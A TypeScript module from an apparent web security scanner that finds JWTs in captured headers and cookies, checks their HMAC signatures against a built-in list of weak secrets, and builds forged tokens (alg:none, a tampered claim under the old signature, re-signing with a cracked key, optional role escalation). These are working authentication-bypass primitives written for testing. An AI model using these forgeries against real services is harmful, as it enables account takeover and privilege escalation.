// JWT deterministic analysis core (WSTG-SESS, session_probe). Pure — no network, no LLM.
// Parses JWTs found in captured session material and produces:
//   • static verdicts computable from the token alone (alg:none issued, weak HMAC secret, expired)
//   • forged token variants (alg:none, tampered-claim-without-resign, re-signed-with-weak-secret) that
//     the replay layer sends back to the server to test ACCEPTANCE.
// The weak-secret check is a full deterministic break on its own: if a common secret verifies the
// captured token's HMAC signature, the attacker can mint arbitrary tokens — no replay needed to prove it.
import { createHmac } from "node:crypto"

export interface Jwt {
  header: Record<string, unknown>
  payload: Record<string, unknown>
  signingInput: string // `${headerB64}.${payloadB64}` — the bytes the signature covers
  signature: string // base64url signature (empty for alg:none)
  parts: [string, string, string]
}

// A small built-in dictionary of secrets seen in the wild (tutorials, boilerplates, weak deployments).
// Not exhaustive by design — a hit is a high-confidence finding; a miss is not proof of strength.
export const WEAK_JWT_SECRETS = [
  "secret",
  "secretkey",
  "secret_key",
  "your-256-bit-secret",
  "your_jwt_secret",
  "jwt_secret",
  "jwtsecret",
  "password",
  "changeme",
  "change_me",
  "admin",
  "test",
  "key",
  "private",
  "123456",
  "12345678",
  "qwerty",
  "supersecret",
  "super_secret",
  "s3cr3t",
  "default",
  "token",
  "auth",
  "shhhhh",
] as const

function b64urlDecode(s: string): Buffer {
  return Buffer.from(s, "base64url")
}

function b64urlEncode(buf: Buffer | string): string {
  const b = typeof buf === "string" ? Buffer.from(buf, "utf8") : buf
  return b.toString("base64url")
}

function jsonB64url(obj: unknown): string {
  return b64urlEncode(JSON.stringify(obj))
}

// A JWT is three base64url segments joined by dots; the middle is a JSON object. Match loosely, then
// confirm by decoding — a random `a.b.c` string won't parse as `{...}` header+payload.
const JWT_SHAPE = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/

export function parseJwt(token: string): Jwt | undefined {
  const parts = token.split(".")
  if (parts.length < 2 || parts.length > 3) return undefined
  try {
    const header = JSON.parse(b64urlDecode(parts[0]).toString("utf8"))
    const payload = JSON.parse(b64urlDecode(parts[1]).toString("utf8"))
    if (typeof header !== "object" || header === null || typeof payload !== "object" || payload === null) return undefined
    return {
      header,
      payload,
      signingInput: `${parts[0]}.${parts[1]}`,
      signature: parts[2] ?? "",
      parts: [parts[0], parts[1], parts[2] ?? ""],
    }
  } catch {
    return undefined
  }
}

export interface FoundJwt {
  location: string // e.g. `cookie:session`, `header:authorization`
  raw: string // the exact token substring
  jwt: Jwt
}

// Scan a set of header name/value pairs for JWT-shaped tokens: Authorization bearer, x-*-token headers,
// and every cookie value. Returns each parsed JWT with where it came from.
export function findJwts(headers: { name: string; value: string }[]): FoundJwt[] {
  const out: FoundJwt[] = []
  const push = (location: string, raw: string) => {
    const m = raw.match(JWT_SHAPE)
    if (!m) return
    const jwt = parseJwt(m[0])
    if (jwt) out.push({ location, raw: m[0], jwt })
  }
  for (const h of headers) {
    const name = h.name.toLowerCase()
    if (name === "cookie") {
      for (const pair of h.value.split(";")) {
        const eq = pair.indexOf("=")
        if (eq < 0) continue
        const cname = pair.slice(0, eq).trim()
        const cval = pair.slice(eq + 1).trim()
        push(`cookie:${cname}`, cval)
      }
      continue
    }
    if (name === "authorization" || name.endsWith("-token") || name === "x-api-key" || name === "x-access-token") {
      push(`header:${name}`, h.value.replace(/^Bearer\s+/i, ""))
    }
  }
  return out
}

const HMAC_ALG: Record<string, string> = { HS256: "sha256", HS384: "sha384", HS512: "sha512" }

// True when `secret` is the HMAC key that signed this token (recompute the signature and compare).
export function verifyHmac(jwt: Jwt, secret: string): boolean {
  const alg = String(jwt.header.alg ?? "").toUpperCase()
  const hash = HMAC_ALG[alg]
  if (!hash) return false
  const expect = createHmac(hash, secret).update(jwt.signingInput).digest("base64url")
  // Length-first compare is fine here — the signature is not itself a secret.
  return expect === jwt.signature
}

// The first weak dictionary secret that verifies the token, if any. A hit means the signing key is
// guessable → the attacker can forge arbitrary tokens (full authentication bypass).
export function findWeakSecret(jwt: Jwt, dict: readonly string[] = WEAK_JWT_SECRETS): string | undefined {
  const alg = String(jwt.header.alg ?? "").toUpperCase()
  if (!HMAC_ALG[alg]) return undefined
  for (const s of dict) if (verifyHmac(jwt, s)) return s
  return undefined
}

// ── Forging (build a candidate the replay layer sends to test ACCEPTANCE) ──────────────────────────

// alg:none — drop the signature and declare the token unsigned. Accepted ⇒ the server does not require
// a signature. Includes optional claim changes (e.g. escalate role) to prove impact.
export function forgeNone(jwt: Jwt, claimChanges: Record<string, unknown> = {}): string {
  const header = { ...jwt.header, alg: "none" }
  const payload = { ...jwt.payload, ...claimChanges }
  return `${jsonB64url(header)}.${jsonB64url(payload)}.`
}

// Tamper a claim but KEEP the original signature. Accepted ⇒ the server is not validating the signature
// at all (it trusts the payload). Different break from alg:none.
export function forgeTamperedClaim(jwt: Jwt, claimChanges: Record<string, unknown>): string {
  const payload = { ...jwt.payload, ...claimChanges }
  return `${jwt.parts[0]}.${jsonB64url(payload)}.${jwt.signature}`
}

// Re-sign with a (discovered weak) HMAC secret, optionally changing claims. Accepted ⇒ confirms the weak
// secret end-to-end and demonstrates arbitrary token minting.
export function forgeResigned(jwt: Jwt, secret: string, claimChanges: Record<string, unknown> = {}): string {
  const alg = String(jwt.header.alg ?? "HS256").toUpperCase()
  const hash = HMAC_ALG[alg] ?? "sha256"
  const header = { ...jwt.header }
  const payload = { ...jwt.payload, ...claimChanges }
  const signingInput = `${jsonB64url(header)}.${jsonB64url(payload)}`
  const sig = createHmac(hash, secret).update(signingInput).digest("base64url")
  return `${signingInput}.${sig}`
}

// ── Static analysis (no replay) ─────────────────────────────────────────────────────────────────

export interface JwtStatic {
  alg: string
  alg_none_issued: boolean // the CAPTURED token is itself unsigned — the server issued it that way
  weak_secret?: string // a dictionary secret that verifies the signature (deterministic break)
  expired: boolean // exp is in the past
  exp?: number
}

export function analyzeJwtStatic(jwt: Jwt, now: number = Date.now()): JwtStatic {
  const alg = String(jwt.header.alg ?? "").toUpperCase()
  const exp = typeof jwt.payload.exp === "number" ? (jwt.payload.exp as number) : undefined
  return {
    alg: alg || "(none declared)",
    alg_none_issued: alg === "NONE",
    weak_secret: findWeakSecret(jwt),
    expired: exp != null && exp * 1000 < now,
    exp,
  }
}
